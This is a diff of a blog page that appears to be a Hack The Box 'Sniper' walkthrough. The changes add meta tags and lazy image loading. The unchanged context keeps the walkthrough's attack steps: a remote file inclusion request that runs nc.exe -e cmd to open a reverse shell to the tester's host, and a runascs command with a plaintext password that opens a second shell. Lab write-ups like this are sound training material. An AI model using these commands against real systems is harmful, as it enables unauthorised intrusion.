@@ -3,6 +3,18 @@
 <head>
     <meta charset="utf-8">
     <title>HTB: Sniper | HackWithJordan</title>
+    <!-- site-meta -->
+    <meta name="description" content="Walkthrough of the Hack The Box machine Sniper, from first foothold to full compromise.">
+    <link rel="canonical" href="https://hackwithjordan.com/posts/2024-10-05-Sniper(HTB).html">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="HackWithJordan">
+    <meta property="og:title" content="HTB: Sniper">
+    <meta property="og:description" content="Walkthrough of the Hack The Box machine Sniper, from first foothold to full compromise.">
+    <meta property="og:url" content="https://hackwithjordan.com/posts/2024-10-05-Sniper(HTB).html">
+    <meta property="og:image" content="https://hackwithjordan.com/assets/room/poster.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta property="article:published_time" content="2024-10-05">
+    <!-- /site-meta -->
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="../assets/css/syntax.css">
     <style>
@@ -310,27 +322,27 @@
 
         <p>and it does</p>
 
-        <img alt="Screenshot 2" height="814" src="../img/posts/2024-10-05-Sniper(HTB)/02-0ca2d989d5.png" style="aspect-ratio:2135/814;" width="2135"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 2" height="814" src="../img/posts/2024-10-05-Sniper(HTB)/02-0ca2d989d5.png" style="aspect-ratio:2135/814;" width="2135"/>
 
         <p>dirbuster finds a db.php file located in the user directory. We can confirm it exists with lfi but we cannot see the file.</p>
 
-        <img alt="Screenshot 3" height="482" src="../img/posts/2024-10-05-Sniper(HTB)/03-41184792bc.png" style="aspect-ratio:1846/482;" width="1846"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 3" height="482" src="../img/posts/2024-10-05-Sniper(HTB)/03-41184792bc.png" style="aspect-ratio:1846/482;" width="1846"/>
 
         <p><br/><br/> Putting our own smb share in we can see the machine authenticates to us but we dont get a hash</p>
 
-        <img alt="Screenshot 4" height="257" src="../img/posts/2024-10-05-Sniper(HTB)/04-87777aa438.png" style="aspect-ratio:921/257;" width="921"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 4" height="257" src="../img/posts/2024-10-05-Sniper(HTB)/04-87777aa438.png" style="aspect-ratio:921/257;" width="921"/>
 
-        <img alt="Screenshot 5" height="272" src="../img/posts/2024-10-05-Sniper(HTB)/05-4410d55770.png" style="aspect-ratio:685/272;" width="685"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 5" height="272" src="../img/posts/2024-10-05-Sniper(HTB)/05-4410d55770.png" style="aspect-ratio:685/272;" width="685"/>
 
         <p>With RFI we can include a shell and have RCE</p>
 
-        <img alt="Screenshot 6" height="1120" src="../img/posts/2024-10-05-Sniper(HTB)/06-7cd4e9190b.png" style="aspect-ratio:1972/1120;" width="1972"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 6" height="1120" src="../img/posts/2024-10-05-Sniper(HTB)/06-7cd4e9190b.png" style="aspect-ratio:1972/1120;" width="1972"/>
 
         <p>We can get a reverse shell using netcat</p>
 
         <p><code><strong>GET /blog/?lang=\\10.10.14.8\share\cmd.php&amp;cmd=\\10.10.14.8\share\nc.exe+-e+cmd+10.10.14.8+443 HTTP/1.1</strong></code><br/><code><strong>Host: 10.10.10.151</strong></code><br/><code><strong>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</strong></code><br/><code><strong>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</strong></code><br/><code><strong>Accept-Language: en-US,en;q=0.5</strong></code><br/><code><strong>Accept-Encoding: gzip, deflate, br</strong></code><br/><code><strong>Connection: keep-alive</strong></code><br/><code><strong>Upgrade-Insecure-Requests: 1</strong></code></p>
 
-        <img alt="Screenshot 7" height="190" src="../img/posts/2024-10-05-Sniper(HTB)/07-75ff571c3a.png" style="aspect-ratio:490/190;" width="490"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 7" height="190" src="../img/posts/2024-10-05-Sniper(HTB)/07-75ff571c3a.png" style="aspect-ratio:490/190;" width="490"/>
 
         <h1 style="color:#5eead4;">Shell as Chris</h1>
 
@@ -342,17 +354,17 @@
 
         <p>There is another user named chris on the machine and the password above is correct for his user but we cannot use it with evil-winrm</p>
 
-        <img alt="Screenshot 8" height="88" src="../img/posts/2024-10-05-Sniper(HTB)/08-e675b8a46d.png" style="aspect-ratio:1262/88;" width="1262"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 8" height="88" src="../img/posts/2024-10-05-Sniper(HTB)/08-e675b8a46d.png" style="aspect-ratio:1262/88;" width="1262"/>
 
         <p>I transferred runascs.exe to the machine so I can get a shell as chris</p>
 
         <pre class="terminal"><code>.\runascs.exe chris 36mEAhz/B8xQ~2VM cmd -r 10.10.14.8:9999</code></pre>
 
-        <img alt="Screenshot 9" height="226" src="../img/posts/2024-10-05-Sniper(HTB)/09-721b0344aa.png" style="aspect-ratio:496/226;" width="496"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 9" height="226" src="../img/posts/2024-10-05-Sniper(HTB)/09-721b0344aa.png" style="aspect-ratio:496/226;" width="496"/>
 
         <p>Got the admin hash and it cracks to $uperpassw0rd but its only valid for the website and not the actual admin password</p>
 
-        <img alt="Screenshot 10" height="119" src="../img/posts/2024-10-05-Sniper(HTB)/10-8b67aafaff.png" style="aspect-ratio:758/119;" width="758"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 10" height="119" src="../img/posts/2024-10-05-Sniper(HTB)/10-8b67aafaff.png" style="aspect-ratio:758/119;" width="758"/>
 
         <h1 style="color:#5eead4;">Shell as administrator</h1>
 
@@ -360,9 +372,9 @@
 
         <p>Notice the shell died right after getting the flag. I had to rush through a meterpreter session to even try to get the flag.</p>
 
-        <img alt="Screenshot 11" height="542" src="../img/posts/2024-10-05-Sniper(HTB)/11-382871b292.png" style="aspect-ratio:954/542;" width="954"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 11" height="542" src="../img/posts/2024-10-05-Sniper(HTB)/11-382871b292.png" style="aspect-ratio:954/542;" width="954"/>
 
-        <img alt="Screenshot 12" height="641" src="../img/posts/2024-10-05-Sniper(HTB)/12-fa1b4f96d8.png" style="aspect-ratio:698/641;" width="698"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 12" height="641" src="../img/posts/2024-10-05-Sniper(HTB)/12-fa1b4f96d8.png" style="aspect-ratio:698/641;" width="698"/>
     </article>
 
 <script>
